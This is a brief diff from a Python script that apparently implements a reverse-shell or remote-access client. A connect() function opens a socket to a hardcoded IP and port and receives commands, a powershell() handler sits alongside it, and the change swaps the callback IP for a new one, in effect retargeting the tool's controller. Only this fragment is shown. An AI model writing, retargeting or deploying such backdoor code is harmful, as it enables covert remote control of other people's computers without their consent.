@@ -81,7 +81,7 @@ def powershell(s,data):
 
 def connect():
    s=socket.socket()
-   host="10.120.166.86"
+   host="10.120.141.214"
    port=1235
    s.connect((host,port))
    choice=s.recv(1024)
